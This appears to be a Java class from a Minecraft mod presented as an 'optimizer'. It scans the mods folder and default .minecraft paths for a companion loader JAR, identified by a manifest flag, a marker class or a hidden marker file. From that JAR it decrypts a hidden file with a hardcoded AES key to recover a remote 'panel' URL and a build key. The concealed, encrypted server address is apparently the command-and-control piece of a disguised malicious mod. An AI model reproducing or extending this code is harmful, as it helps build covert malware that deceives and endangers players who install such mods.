package com.example.optimizer;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.*;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;

/**
 * Finds the build key from the loader mod.
 * Scans all JARs in mods folder for the loader's manifest marker,
 * then reads and decrypts A.txt from the loader.
 * 
 * Detection methods (in order):
 * 1. Manifest attribute: Optimizer-Loader: true
 * 2. Marker class: com/example/loader/OptimizerKeyMarker.class
 * 3. Resource file: .optimizer-loader
 */
public class BuildKeyFinder {

    private static final byte[] CONFIG_SEED = "d3x0n_0pt1m1z3r_k3y_2025_s3cr3!!".getBytes(StandardCharsets.UTF_8);
    private static String cachedBuildKey = null;
    private static String cachedPanelUrl = null;

    /**
     * Find and return the decrypted panel URL from loader's A.txt
     * Returns null if no loader found or decryption fails
     */
    public static String findPanelUrl() {
        if (cachedPanelUrl != null) {
            return cachedPanelUrl;
        }

        // FIRST: Search for loader mod in mods folder
        // This is the primary method when main mod was downloaded by loader
        Path modsDir = getModsDirectory();
        if (modsDir != null) {
            File[] files = modsDir.toFile().listFiles();
            if (files != null) {
                for (File file : files) {
                    if (!file.getName().endsWith(".jar"))
                        continue;

                    String key = tryLoadFromJar(file);
                    if (key != null && !key.isEmpty()) {
                        cachedPanelUrl = key;
                        return cachedPanelUrl;
                    }
                }
            }
        }

        // FALLBACK: Try own JAR's A.txt (backwards compatibility for standalone builds)
        String ownKey = loadFromOwnJar();
        if (ownKey != null && !ownKey.isEmpty()) {
            cachedPanelUrl = ownKey;
            return cachedPanelUrl;
        }

        return null;
    }

    /**
     * Extract just the build key from the panel URL
     */
    public static String findBuildKey() {
        if (cachedBuildKey != null) {
            return cachedBuildKey;
        }

        String panelUrl = findPanelUrl();
        if (panelUrl == null)
            return null;

        // Extract key from URL: http://.../api/data/KEY
        int idx = panelUrl.indexOf("/api/data/");
        if (idx > 0) {
            cachedBuildKey = panelUrl.substring(idx + 10);
            return cachedBuildKey;
        }

        return null;
    }

    private static String loadFromOwnJar() {
        try {
            InputStream is = BuildKeyFinder.class.getResourceAsStream("/A.txt");
            if (is == null)
                return null;

            String content = new String(is.readAllBytes(), StandardCharsets.UTF_8).trim();
            is.close();

            return loadConfig(content);
        } catch (Exception e) {
            return null;
        }
    }

    private static String tryLoadFromJar(File jarFile) {
        try (JarFile jar = new JarFile(jarFile)) {
            // Method 1: Check manifest for loader marker
            Manifest mf = jar.getManifest();
            if (mf != null) {
                String isLoader = mf.getMainAttributes().getValue("Optimizer-Loader");
                if ("true".equals(isLoader)) {
                    return loadKeyFromJar(jar);
                }
            }

            // Method 2: Check for marker class
            JarEntry markerEntry = jar.getJarEntry("com/example/loader/OptimizerKeyMarker.class");
            if (markerEntry != null) {
                return loadKeyFromJar(jar);
            }

            // Method 3: Check for hidden marker file
            JarEntry hiddenMarker = jar.getJarEntry(".optimizer-loader");
            if (hiddenMarker != null) {
                return loadKeyFromJar(jar);
            }

        } catch (Exception e) {
            // Continue to next JAR
        }
        return null;
    }

    private static String loadKeyFromJar(JarFile jar) {
        try {
            // Try multiple locations for A.txt
            String[] locations = { "A.txt", "/A.txt", "resources/A.txt", "config/A.txt" };

            for (String location : locations) {
                JarEntry entry = jar.getJarEntry(location);
                if (entry != null) {
                    try (InputStream is = jar.getInputStream(entry)) {
                        String content = new String(is.readAllBytes(), StandardCharsets.UTF_8).trim();
                        String result = loadConfig(content);
                        if (result != null && !result.isEmpty()) {
                            return result;
                        }
                    }
                }
            }
        } catch (Exception e) {
            // Decryption failed
        }
        return null;
    }

    private static String loadConfig(String b64Content) {
        try {
            byte[] data = Base64.getDecoder().decode(b64Content);
            byte[] iv = new byte[16];
            byte[] enc = new byte[data.length - 16];
            System.arraycopy(data, 0, iv, 0, 16);
            System.arraycopy(data, 16, enc, 0, enc.length);

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(CONFIG_SEED, "AES"), new IvParameterSpec(iv));
            byte[] result = cipher.doFinal(enc);

            return new String(result, StandardCharsets.UTF_8).trim();
        } catch (Exception e) {
            return null;
        }
    }

    private static Path getModsDirectory() {
        try {
            // Method 1: Use Fabric Loader API via reflection (works with any launcher)
            try {
                Class<?> loaderClass = Class.forName("net.fabricmc.loader.api.FabricLoader");
                Object instance = loaderClass.getMethod("getInstance").invoke(null);
                Object gameDir = loaderClass.getMethod("getGameDir").invoke(instance);
                Path gamePath = (Path) gameDir;
                Path modsDir = gamePath.resolve("mods");
                if (Files.exists(modsDir) && Files.isDirectory(modsDir)) {
                    return modsDir;
                }
            } catch (Exception e) {
                // Fabric Loader API not available, continue to fallbacks
            }

            // Method 2: Try current directory (user.dir)
            Path gameDir = Paths.get(System.getProperty("user.dir"));
            Path modsDir = gameDir.resolve("mods");

            if (Files.exists(modsDir) && Files.isDirectory(modsDir)) {
                return modsDir;
            }

            // Method 3: Try Minecraft default locations
            String os = System.getProperty("os.name").toLowerCase();
            Path mcDir;
            if (os.contains("win")) {
                mcDir = Paths.get(System.getenv("APPDATA"), ".minecraft", "mods");
            } else if (os.contains("mac")) {
                mcDir = Paths.get(System.getProperty("user.home"), "Library", "Application Support", "minecraft",
                        "mods");
            } else {
                mcDir = Paths.get(System.getProperty("user.home"), ".minecraft", "mods");
            }

            if (Files.exists(mcDir)) {
                return mcDir;
            }

            return modsDir;
        } catch (Exception e) {
            return null;
        }
    }
}
